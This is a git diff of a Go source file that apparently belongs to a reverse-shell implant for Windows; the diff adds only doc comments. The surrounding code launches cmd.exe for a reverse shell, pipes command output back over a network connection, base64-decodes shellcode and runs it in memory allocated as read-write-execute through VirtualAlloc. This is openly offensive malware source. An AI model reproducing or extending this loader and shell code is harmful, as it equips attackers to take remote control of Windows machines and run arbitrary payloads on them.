@@ -16,6 +16,7 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
+// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
 func GetShell() *exec.Cmd {
 	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
@@ -23,6 +24,8 @@ func GetShell() *exec.Cmd {
 	return cmd
 }
 
+// ExecuteCmd runs the provided command through cmd.exe
+// and redirects the result to the provided net.Conn object.
 func ExecuteCmd(command string, conn net.Conn) {
 	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
 	cmd_path := "C:\\Windows\\System32\\cmd.exe"
@@ -33,6 +36,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Run()
 }
 
+// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
@@ -41,6 +45,8 @@ func InjectShellcode(encShellcode string) {
 	}
 }
 
+// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
+// and executes it via a syscall.Syscall call.
 func ExecShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
